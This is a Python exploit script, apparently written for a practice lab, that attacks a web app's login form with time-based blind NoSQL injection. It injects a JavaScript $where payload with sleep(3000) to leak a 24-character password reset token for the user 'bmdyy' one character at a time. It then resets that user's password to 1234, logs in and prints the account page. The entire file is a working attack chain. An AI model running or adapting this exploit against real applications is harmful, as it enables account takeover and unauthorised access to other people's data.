import requests
import sys
import time
from rich import print #Cores no print
from bs4 import BeautifulSoup #Parsing de HTML
requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = f"{sys.argv[1]}/login"
name = ''

while True:
    printables = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-'
    for char in printables:
        data = {
            # 'username': f'" || (this.username.match(\'^{name}{char}.*\')) && sleep(3000) || ""=="', Descobrir o username
            'username': f'" || (this.username.match(\'bmdyy\')) && (this.token.match(\'^{name}{char}.*\')) && sleep(3000) || ""=="',
            'password': 'aaaaaaaaaaa'
        }
        start = time.time()
        response = requests.post(url, data=data, headers=headers, proxies=proxies)
        end = time.time()
        if ((end - start) >= 3):
        	name += char
        	print(f'[bold yellow]Retrieving code: {name}[/bold yellow]')
        	a = len(name)
        	if a == 24:
        		print(f'\n[bold green]Code retrieved: {name}[/bold green]\n')
        		url = f"{sys.argv[1]}/reset"
        		data = {
        			'token': {name},
        			'password': 1234,
        			'confirm': 1234
        		}
        		response = requests.post(url, data=data, headers=headers, proxies=proxies)
        		print(f'[bold green]Password changed to: 1234 and logged in[/bold green]')
        		url = f"{sys.argv[1]}/login"
        		data = {
        			'username': 'bmdyy',
        			'password': 1234
        		}
        		response = requests.post(url, data=data, headers=headers, proxies=proxies)
        		html_response = response.text # Salva a response em uma variável
        		soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
        		results_tag = soup.find('div', class_='column the-box')
        		print(results_tag.text)
        		sys.exit()
        	else:
        		break